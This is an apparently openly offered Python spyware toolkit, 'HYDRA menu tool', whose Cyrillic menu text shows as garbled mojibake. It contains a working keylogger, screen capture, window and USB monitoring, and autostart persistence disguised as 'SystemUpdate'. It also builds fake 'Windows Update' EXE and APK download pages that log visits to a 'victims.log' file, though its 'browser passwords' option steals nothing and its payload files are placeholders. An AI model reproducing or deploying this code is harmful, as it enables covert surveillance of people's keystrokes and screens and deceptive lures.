#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os, socket, subprocess, threading, time, platform, requests, http.server, socketserver
from pynput import keyboard
from datetime import datetime
from PIL import ImageGrab
from colorama import Fore, Style, init

init(autoreset=True)

PORT = 8000
LOGFILE = "victims.log"


# ================== –¶–≤–µ—Ç–Ω–æ–π –±–∞–Ω–Ω–µ—Ä ====================
def show_banner():
    print(Fore.RED + Style.BRIGHT + r"""
‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó 
‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë
‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïù ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë
‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë     ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë
‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù
 ‚ñà‚ñà‚ñà H Y D R A  -  M E N U   T O O L ‚ñà‚ñà‚ñà
""")


# ================== –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é ======================
def show_menu():
    print(Fore.CYAN + Style.BRIGHT + """
–í—ã–±–µ—Ä–∏—Ç–µ —Ñ—É–Ω–∫—Ü–∏—é:
1) –ö–µ–π–ª–æ–≥–≥–µ—Ä
2) –ü–æ—Ä—Ç-—Å–∫–∞–Ω–Ω–µ—Ä
3) –°–∫—Ä—ã—Ç—ã–µ —Å–∫—Ä–∏–Ω—à–æ—Ç—ã
4) –°–±–æ—Ä Wi-Fi –∏–Ω—Ñ—ã
5) –ü–∞—Ä–æ–ª–∏ –∏–∑ –±—Ä–∞—É–∑–µ—Ä–∞ (—Å –ø–æ–¥–º–µ–Ω—é)
6) –°–ª–µ–∂–∫–∞ –∑–∞ USB
7) Whois/GeoIP
8) –°–ª–µ–∂–∫–∞ –∑–∞ –∞–∫—Ç–∏–≤–Ω—ã–º–∏ –æ–∫–Ω–∞–º–∏
9) –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞
10) ASCII-–∞—Ä—Ç üé®
11) –í—Å–µ —Ñ—É–Ω–∫—Ü–∏–∏ –≤–º–µ—Å—Ç–µ
0) –í—ã—Ö–æ–¥
""")


# ===================== –õ–æ–≥–≥–µ—Ä =========================
def log_event(msg):
    print(Fore.YELLOW + f"[LOG] {msg}")
    with open(LOGFILE, "a") as f:
        f.write(msg + "\n")


# ========== –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ –º–æ–¥—É–ª–∏ —Ñ—É–Ω–∫—Ü–∏–π ===========

def keylogger():
    def on_press(key):
        with open("hydra_keys.log", "a") as log:
            log.write(f"{key}\n")

    threading.Thread(target=keyboard.Listener(on_press=on_press).start(), daemon=True).start()
    print(Fore.GREEN + "[‚úì] –ö–µ–π–ª–æ–≥–≥–µ—Ä –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω.")


def scan_ports(target):
    print(Fore.YELLOW + f"[!] –°–∫–∞–Ω –ø–æ—Ä—Ç–æ–≤: {target}")
    for port in range(1, 1025):
        try:
            with socket.socket() as s:
                s.settimeout(0.2)
                s.connect((target, port))
                print(Fore.GREEN + f"[+] Port {port} –æ—Ç–∫—Ä—ã—Ç")
        except:
            pass


def snap_screen():
    img = ImageGrab.grab()
    name = f"snap_{datetime.now().strftime('%H%M%S')}.png"
    img.save(name)
    print(Fore.CYAN + f"[‚úì] –°–∫—Ä–∏–Ω —Å–æ—Ö—Ä–∞–Ω—ë–Ω –∫–∞–∫ {name}")


def get_active_window():
    try:
        out = subprocess.getoutput("xdotool getactivewindow getwindowname")
        print(Fore.MAGENTA + f"[‚òÖ] –ê–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ: {out}")
    except:
        print("[!] xdotool –Ω–µ –Ω–∞–π–¥–µ–Ω")


def browser_dump_menu():
    print(Fore.CYAN + """
–í—ã–±–µ—Ä–∏—Ç–µ —Å–ø–æ—Å–æ–± –¥–æ—Å—Ç–∞–≤–∫–∏:
1) –°–∞–π—Ç (–ø—Ä–∏ –∑–∞—Ö–æ–¥–µ –ª–æ–≥–∏—Ä—É–µ—Ç—Å—è)
2) EXE —Ñ–∞–π–ª (—Ñ–µ–π–∫–æ–≤–∞—è –∑–∞–≥—Ä—É–∑–∫–∞)
3) APK —Ñ–∞–π–ª (—Ñ–µ–π–∫–æ–≤–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞)
""")
    choice = input(Fore.GREEN + "hydra > ")

    os.makedirs("web", exist_ok=True)

    if choice == "1":
        # –°–æ–∑–¥–∞–Ω–∏–µ —Ñ–µ–π–∫–æ–≤–æ–≥–æ —Å–∞–π—Ç–∞
        with open("web/index.html", "w") as f:
            f.write("""
<html><body><h2>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±—Ä–∞—É–∑–µ—Ä–∞...</h2><script>fetch("/log?target=visited_site")</script></body></html>
""")
        log_event("üì° –§–µ–π–∫-—Å–∞–π—Ç —Å–æ–∑–¥–∞–Ω")

        class Handler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path.startswith("/log"):
                    payload = self.path.split("target=")[-1]
                    log_event(f"üéØ –ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: {payload}")
                    self.send_response(204)
                    self.end_headers()
                else:
                    super().do_GET()

        def run_server():
            os.chdir("web")
            with socketserver.TCPServer(("", PORT), Handler) as httpd:
                print(Fore.GREEN + f"[+] –°–µ—Ä–≤–µ—Ä —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–∞ http://localhost:{PORT}")
                httpd.serve_forever()

        run_server()

    elif choice == "2":
        # –°–æ–∑–¥–∞–Ω–∏–µ —Ñ–µ–π–∫–æ–≤–æ–≥–æ EXE —Ñ–∞–π–ª–∞
        with open("web/index.html", "w") as f:
            f.write("""
<html><body><h2>–°–∫–∞—á–∞—Ç—å Windows Update</h2><a href='/file.exe'>‚¨á –°–∫–∞—á–∞—Ç—å</a><script>fetch("/log?target=downloaded_exe")</script></body></html>
""")
        with open("web/file.exe", "wb") as exe:
            exe.write(b"FAKE EXE")  # –§–µ–π–∫–æ–≤—ã–π EXE —Ñ–∞–π–ª
        log_event("üíæ –§–µ–π–∫–æ–≤—ã–π EXE —Ñ–∞–π–ª —Å–æ–∑–¥–∞–Ω")

        class Handler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path.startswith("/log"):
                    payload = self.path.split("target=")[-1]
                    log_event(f"üéØ –ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: {payload}")
                    self.send_response(204)
                    self.end_headers()
                else:
                    super().do_GET()

        def run_server():
            os.chdir("web")
            with socketserver.TCPServer(("", PORT), Handler) as httpd:
                print(Fore.GREEN + f"[+] –°–µ—Ä–≤–µ—Ä —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–∞ http://localhost:{PORT}")
                httpd.serve_forever()

        run_server()

    elif choice == "3":
        # –°–æ–∑–¥–∞–Ω–∏–µ —Ñ–µ–π–∫–æ–≤–æ–≥–æ APK —Ñ–∞–π–ª–∞
        with open("web/index.html", "w") as f:
            f.write("""
<html><body><h2>–£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å APK</h2><a href='/app.apk'>‚¨á –°–∫–∞—á–∞—Ç—å</a><script>fetch("/log?target=downloaded_apk")</script></body></html>
""")
        with open("web/app.apk", "wb") as apk:
            apk.write(b"FAKE APK")  # –§–µ–π–∫–æ–≤—ã–π APK —Ñ–∞–π–ª
        log_event("ü§ñ –§–µ–π–∫–æ–≤—ã–π APK —Ñ–∞–π–ª —Å–æ–∑–¥–∞–Ω")

        class Handler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path.startswith("/log"):
                    payload = self.path.split("target=")[-1]
                    log_event(f"üéØ –ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: {payload}")
                    self.send_response(204)
                    self.end_headers()
                else:
                    super().do_GET()

        def run_server():
            os.chdir("web")
            with socketserver.TCPServer(("", PORT), Handler) as httpd:
                print(Fore.GREEN + f"[+] –°–µ—Ä–≤–µ—Ä —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–∞ http://localhost:{PORT}")
                httpd.serve_forever()

        run_server()

    else:
        print(Fore.RED + "–ù–µ–≤–µ—Ä–Ω—ã–π –≤—ã–±–æ—Ä")
        return


def geo_lookup(ip):
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json")
        print(Fore.BLUE + "[GeoIP]:", r.text)
    except:
        print("[!] –û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞")


def usb_monitor():
    def monitor():
        print(Fore.LIGHTBLUE_EX + "[‚úì] –°–ª–µ–∂–∫–∞ –∑–∞ USB –∞–∫—Ç–∏–≤–Ω–∞.")
        old = subprocess.getoutput("lsblk")
        while True:
            time.sleep(3)
            new = subprocess.getoutput("lsblk")
            if new != old:
                print(Fore.LIGHTYELLOW_EX + "[USB] –û–±–Ω–∞—Ä—É–∂–µ–Ω–æ –Ω–æ–≤–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ!")
                old = new

    threading.Thread(target=monitor, daemon=True).start()


def setup_autostart():
    path = os.path.abspath(__file__)
    home = os.path.expanduser("~")
    auto = os.path.join(home, ".config/autostart")
    os.makedirs(auto, exist_ok=True)
    with open(os.path.join(auto, "hydra.desktop"), "w") as f:
        f.write(f"""[Desktop Entry]
Type=Application
Exec={path}
Hidden=false
X-GNOME-Autostart-enabled=true
Name=SystemUpdate
""")
    print(Fore.LIGHTGREEN_EX + "[‚úì] –ê–≤—Ç–æ–∑–∞–ø—É—Å–∫ –¥–æ–±–∞–≤–ª–µ–Ω.")


def wifi_list():
    print(Fore.LIGHTCYAN_EX + "[‚úì] –°–∫–∞–Ω–∏—Ä—É–µ–º Wi-Fi...")
    os.system("nmcli dev wifi list")


def ascii_art():
    print(Fore.MAGENTA + r"""
    .-''''-.
  .'        `.
 /      .-''-. \
|    .'      `.|
\__/`.___..__.'_/ 
Hydra –ø—Ä–æ–±—É–¥–∏–ª–∞—Å—å üêç
""")


def run_all():
    keylogger()
    usb_monitor()
    ascii_art()
    system_info()
    wifi_list()
    get_active_window()
    snap_screen()
    setup_autostart()
    print(Fore.RED + "[üî•] –í—Å–µ —Ñ—É–Ω–∫—Ü–∏–∏ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω—ã.")


def system_info():
    print(Fore.LIGHTWHITE_EX + f"[SysInfo] {platform.platform()} | {platform.node()}")


# ================== MAIN =====================

def main():
    show_banner()
    while True:
        show_menu()
        cmd = input(Fore.GREEN + "hydra > ")

        if cmd == "1":
            keylogger()
        elif cmd == "2":
            ip = input("–í–≤–µ–¥–∏—Ç–µ IP: ")
            scan_ports(ip)
        elif cmd == "3":
            snap_screen()
        elif cmd == "4":
            wifi_list()
        elif cmd == "5":
            browser_dump_menu()
        elif cmd == "6":
            usb_monitor()
        elif cmd == "7":
            ip = input("–í–≤–µ–¥–∏—Ç–µ IP/–¥–æ–º–µ–Ω: ")
            geo_lookup(ip)
        elif cmd == "8":
            get_active_window()
        elif cmd == "9":
            setup_autostart()
        elif cmd == "10":
            ascii_art()
        elif cmd == "11":
            run_all()
        elif cmd == "0":
            print("–í—ã—Ö–æ–¥.")
            break
        else:
            print(Fore.RED + "–ù–µ–≤–µ—Ä–Ω—ã–π –≤–≤–æ–¥.")


if __name__ == "__main__":
    main()
